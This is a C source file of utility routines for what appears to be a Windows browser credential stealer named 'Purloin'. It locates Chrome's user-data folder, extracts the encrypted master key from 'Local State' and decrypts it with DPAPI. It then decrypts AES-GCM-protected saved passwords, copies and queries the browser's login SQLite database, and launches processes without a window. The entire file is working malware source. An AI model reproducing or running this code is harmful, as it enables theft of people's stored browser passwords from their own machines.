#include "includes/Purloin_Utils.h"
#include "includes/Purloin_Debug.h"

// Converts CHAR in Base64 to Bytes.  User must free the byte data after usage.
BOOL base64_to_byte(PCHAR base64_string, BYTE** byte_string, PDWORD size_byte_string) {
	/* To Convert CHAR form of Base64 encoded master key to Byte form, the resulting buffer size is needed, so 'size_byte_master_key' is passed to get that value */
	if (!(CryptStringToBinaryA(base64_string, 0, CRYPT_STRING_BASE64, NULL, size_byte_string, NULL, NULL))) {
		return FALSE;
	}
	/* Using above 'size_byte_master_key', a buffer is created to hold Byte form of Base64 encoded master key */
	*byte_string = (BYTE*)malloc(*size_byte_string);
	if (!*byte_string) {
		return FALSE;
	}
	/* Convert Base64 encoded master key into byte form */
	if (!(CryptStringToBinaryA(base64_string, 0, CRYPT_STRING_BASE64, *byte_string, size_byte_string, NULL, NULL))) {
		return FALSE;
	}
	return TRUE;
}

// Gets the Master Key of Chrome, which is inside "%LOCALAPPDATA%\Google\Chrome\User Data\Local State" and store it in [PWCHAR] enc_master_key
BOOL get_json_property(PCWSTR browser_dir, PCWSTR data_file, PCWSTR property, PWCHAR enc_master_key, WORD enc_master_key_size, PSTR buf_outMsg, DWORD buf_outSize) {	
	errno_t err;

	/* Copy path to temporary buffer */
	WCHAR file_location[MAX_PATH];								// First Buffer to hold path for 'Local State' file, and the second buffer to hold two wchars (including null-term). Buffer is used to read file
	if ((err = wmemcpy_s(file_location, MAX_PATH, browser_dir, lstrlenW(browser_dir))) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_json_property: wmemcpy_s: Copying Chrome path to buffer error code: %d\n", err);)
			return FALSE;
	}
	/* Add 'file name' to temporary buffer */
	if ((err = wmemcpy_s(file_location + lstrlenW(browser_dir), MAX_PATH, data_file, lstrlenW(data_file) + 1)) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_json_property: wmemcpy_s: Copying '%ws' file path to buffer error code: %d\n", data_file, err);)
			return FALSE;
	}
	/* Check if given file exists */
	if (!PathFileExistsW(file_location)) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_json_property: PathFileExistsW: No '%ws' file found.\n", data_file);)
			return FALSE;
	}
	/* Opens the file in UTF-8 mode */
	FILE* fp_file = NULL;												// File pointer to the given file
	if ((err = _wfopen_s(&fp_file, file_location, L"r, ccs=UTF-8")) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_json_property: _wfopen_s: Opening '%ws' file error code: %d:%d\n", data_file, err, errno);)
	}
	if (fp_file == NULL) {
		_wcserror_s(enc_master_key, enc_master_key_size, err);
		return FALSE;
	}

	/* Read and get the given json property key */
	WCHAR read_buffer[2];
	int i = 0;
	BOOL quoteFound = FALSE, propertyFound = FALSE;
	while (fgetws(read_buffer, 2, fp_file)) {
		if (!wcscmp(read_buffer, L"\"")) {
			if (!quoteFound) {
				quoteFound = TRUE;
				continue;
			}
			else {
				quoteFound = FALSE;
				if (!wcscmp(enc_master_key, property)) {
					wmemset(enc_master_key, L'\0', enc_master_key_size);
					i = 0;
					propertyFound = TRUE;
					continue;
				}
				if (propertyFound) {
					if ((err = fclose(fp_file)) != 0) {
						Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_json_property: fclose: '%ws' closing error code: %d\n", data_file, err);)
					}
					return TRUE;
				}
				enc_master_key[i] = L'\0';
				wmemset(enc_master_key, L'\0', enc_master_key_size);
				i = 0;
			}
		}
		else if (quoteFound) {
			enc_master_key[i] = read_buffer[0];
			i = (i + 1) % (enc_master_key_size - 1);
		}
	}

	/* If encrypted key is not found */
	if ((err = fclose(fp_file)) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_json_property: fclose: Local File closing error code: %d\n", err);)
	}
	return FALSE;
}

// Decrypts data that is encrypted using DPAPI API.
BOOL dpapi_decrypt(BYTE* encrypted_data, DWORD size_encrypted_data, DATA_BLOB* decrypted_data) {
	DATA_BLOB blob_enc_masterkey;
	blob_enc_masterkey.cbData = size_encrypted_data;
	blob_enc_masterkey.pbData = encrypted_data;
	if (!(CryptUnprotectData(&blob_enc_masterkey, NULL, NULL, NULL, NULL, 0, decrypted_data))) {
		return FALSE;
	}
	return TRUE;
}

// Decrypts AES-GCM data using given bcrypt handle
BOOL aesgcm_decrypt(BCRYPT_KEY_HANDLE handle_bcrypt, DWORD offset, BYTE* encrypted_password, int* size_encrypted_datablob, BYTE* iv, DWORD size_iv, BYTE* tag, DWORD size_tag, BYTE** decrypted_byte, PULONG decrypted_byte_size) {
	/* Set Additional info to the struct */
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO aes_gcm_info;						// Struct to hold additional information required for decrypting (Nonce, Tag)
	BCRYPT_INIT_AUTH_MODE_INFO(aes_gcm_info);
	aes_gcm_info.pbNonce = iv;
	aes_gcm_info.cbNonce = size_iv;
	aes_gcm_info.pbTag = tag;
	aes_gcm_info.cbTag = size_tag;

	/* Get the buffer size required to hold the decrypted bytes to the 'size_required_decrypted_buffer' */
	ULONG size_required_decrypted_buffer;									// To get the size required to hold decrypted bytes
	NTSTATUS status;
	status = BCryptDecrypt(handle_bcrypt, encrypted_password, *size_encrypted_datablob - (offset + size_iv + size_tag), &aes_gcm_info, NULL, 0, NULL, 0, &size_required_decrypted_buffer, 0);
	if (!NT_SUCCESS(status)) {
		return FALSE;
	}

	/* In case if the existing buffer size is not enough, Resize it to fit */
	if (size_required_decrypted_buffer > *decrypted_byte_size) {
		BYTE* tmp_byte;															// Temporary pointer, in case if the buffer to hold decrypted bytes is not enough
		tmp_byte = (BYTE*)realloc(*decrypted_byte, size_required_decrypted_buffer);

		if (!tmp_byte) {
			return FALSE;
		}
		else {
			*decrypted_byte = tmp_byte;
			*decrypted_byte_size = size_required_decrypted_buffer;
		}
	}

	/* Actual decryption process */
	status = BCryptDecrypt(handle_bcrypt, encrypted_password, *size_encrypted_datablob - (offset + size_iv + size_tag), &aes_gcm_info, NULL, 0, *decrypted_byte, *decrypted_byte_size, &size_required_decrypted_buffer, 0);
	if (!NT_SUCCESS(status)) {
		return FALSE;
	}

	return TRUE;
}

// Gets the browser directory specified by the FOLDER_ID (look at win32 docs) and the relative path from that FOLDER_ID
DWORD get_user_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, DWORD buf_outSize) {
	PWSTR p_temp_userdata_location = NULL;															// Temporary pointer to hold returned user data (%LOCALAPPDATA%, %APPDATA%, etc.) folder path
	HRESULT hr;																						// Error handling 
	errno_t err;																					// Error handling 

	/* Get Local Appdata Directory of the user */
	if (FAILED(hr = SHGetKnownFolderPath(folder_id, 0, NULL, &p_temp_userdata_location))) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: SHGetKnownFolderPath: Getting Local Appdata Directory error code: %ld\n", hr);)
		CoTaskMemFree(p_temp_userdata_location);
		return FALSE;
	}

	/* Copy %LOCALAPPDATA% location to permenant buffer */
	if ((err = wmemcpy_s(buf_path, MAX_PATH, p_temp_userdata_location, lstrlenW(p_temp_userdata_location))) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: wmemcpy_s: Copying %%LOCALAPPDATA%% to buffer error code: %d\n", err);)
		return FALSE;
	}

	/* Copy relative path of Chrome directory from %LOCALAPPDATA% to permenant buffer */
	if ((err = wmemcpy_s(buf_path + lstrlenW(p_temp_userdata_location), MAX_PATH, browser_location, lstrlenW(browser_location)+1)) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: wmemcpy_s: Copying Chrome Userdata folder to buffer error code: %d\n", err);)
		return FALSE;
	}

	/* Check if that Chrome path exitsts */
	if (!PathFileExistsW(buf_path)) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: PathFileExistsW: No folder found.\n");)
		return FALSE;
	}

	/* Free the memory allocated by temporary buffer to hold the %LOCALAPPDATA% folder */
	CoTaskMemFree(p_temp_userdata_location);
	return TRUE;
}

// Check if specified 'test_string' is in 'substring'
BOOL checkSubtring(const WCHAR* substring, PWCHAR test_string) {
	if (lstrlenW(substring) <= lstrlenW(test_string)) {
		for (int i = 0; i < lstrlenW(substring); i++) {
			if (substring[i] != test_string[i]) return FALSE;
		}
		return TRUE;
	}
	return FALSE;
}

// Gets file/directory exploration handle and a struct that contains info about the found files/sub-directories of the specified directory. Which then can be used to call FileNextA() to iterate over found files/sub-dirs. 
BOOL get_file_explorer(PWSTR inpur_dir, WIN32_FIND_DATAW* dir_files, HANDLE* dir_handle, PSTR buf_outMsg, DWORD buf_outSize) {
	errno_t err;

	/* Append '\*' to the chrome_dir to get the file handle for the '%LOCALAPPDATA%\Google\Chrome\User Data\*' folder */
	if ((err = wcscat_s(inpur_dir, MAX_PATH, L"\\*")) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "wcscat_s: Appending '\\\\*' to input_dir error: %d\n", err);)
		return FALSE;
	}

	/* Gets the first file/folder handle in the directory, and set it to 'dir_handle' */
	*dir_handle = FindFirstFileW(inpur_dir, dir_files);
	if (dir_handle == INVALID_HANDLE_VALUE) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "Getting sub directories error: %lu\n", GetLastError());)
		return FALSE;
	}

	/* Clears the ending '\*' part in the chrome_dir */
	memset(inpur_dir + lstrlenW(inpur_dir) - 2, '\0', 2);

	return TRUE;
}

// Open database connection
BOOL open_database(PWSTR database_location, void** handle_db, BOOL open_copied_instance, PSTR buf_outMsg, DWORD buf_outSize) {
	errno_t err;
	int status;
	WCHAR temp_database_location[MAX_PATH] = L"\0";

	if ((err = wcscat_s(temp_database_location, MAX_PATH, database_location)) != 0) {											// Apend '\\' to the end of chrome_dir_char to make the path for Login Data file for a specific user profile
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "wcscat_s: Appending '\\\\' to database_location error: %d\n", err);)
		return FALSE;
	}

	if (open_copied_instance) {
		WCHAR new_database[MAX_PATH] = L"\0";
		if ((err = wcscat_s(new_database, MAX_PATH, temp_database_location)) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
			Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "wcscat_s: Appending old db path to new db path bufffer error: %d\n", err);)
			return FALSE;
		}
		if ((err = wcscat_s(new_database, MAX_PATH, L"2")) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
			Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "wcscat_s: Appending '2' to end of new db path buffer error: %d\n", err);)
			return FALSE;
		}
		if (!CopyFileW(temp_database_location, new_database, FALSE)) {
			Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "Making copy of database error. Trying to continue.\n");)
		}
		if ((status = sqlite3_open16(new_database, (sqlite3**)handle_db)) != SQLITE_OK) {	// Opens the connection to database
			Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_open16: Error when opening database connection error: %s:%d\n", sqlite3_errmsg(*(sqlite3**)handle_db), status);)
			return FALSE;
		}
	}
	else {
		if ((status = sqlite3_open16(temp_database_location, (sqlite3**)handle_db)) != SQLITE_OK) {	// Opens the connection to database
			Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_open16: Error when opening database connection error: %s:%d\n", sqlite3_errmsg(*(sqlite3**)handle_db), status);)
			return FALSE;
		}
	}
	return TRUE;
}

// Prepare and get the sql handle for sql statement in order to retrieve credentials
int prepare_sql(void* handle_db, void** handle_sql_stmt, const char * sql_stmt, PSTR buf_outMsg, DWORD buf_outSize) {
	int status = sqlite3_prepare_v2((sqlite3*)handle_db, sql_stmt, -1, (sqlite3_stmt**)handle_sql_stmt, 0);
	if (status != SQLITE_OK) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_prepare_v2: Error when preaparing statement, error: %s:%d\n", sqlite3_errmsg((sqlite3*)handle_db), status);)
		return status;
	}
	return 0;
}

// Iterate over results
BOOL iterate_result(void* handle_sql_stmt) {
	if ((sqlite3_step((sqlite3_stmt*)handle_sql_stmt)) == SQLITE_ROW)
		return TRUE;
	else
		return FALSE;
}

// Gets the result of the given index and the type
void* get_result(void* handle_sql_stmt, int index, int type) {
	if (type == TEXT_RESULT) {
		return (void *)sqlite3_column_text((sqlite3_stmt*)handle_sql_stmt, index);
	}
	else if (type == BYTE_RESULT) {
		return (void*)sqlite3_column_blob((sqlite3_stmt*)handle_sql_stmt, index);
	}
}

// Gets the size of the result of the given index
int get_result_size(void* handle_sql_stmt, int index) {
	return sqlite3_column_bytes((sqlite3_stmt*)handle_sql_stmt, index);
}

// Close database connection
BOOL close_database(void* handle_db, void* handle_sql_stmt, PSTR buf_outMsg, DWORD buf_outSize) {
	/* Reset SQL statement */
	NTSTATUS status;
	if ((status = sqlite3_reset((sqlite3_stmt*)handle_sql_stmt)) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_reset: %s:%d\n", sqlite3_errmsg((sqlite3*)handle_db), status);)
		return FALSE;
	}

	/* Close the opened database */
	sqlite3_close((sqlite3*)handle_db);
	return TRUE;
}

// Executes system command
BOOL execute_system(LPCWSTR command) {
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (CreateProcessW(command, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return TRUE;
	}
	else {
		return FALSE;
	}
	
}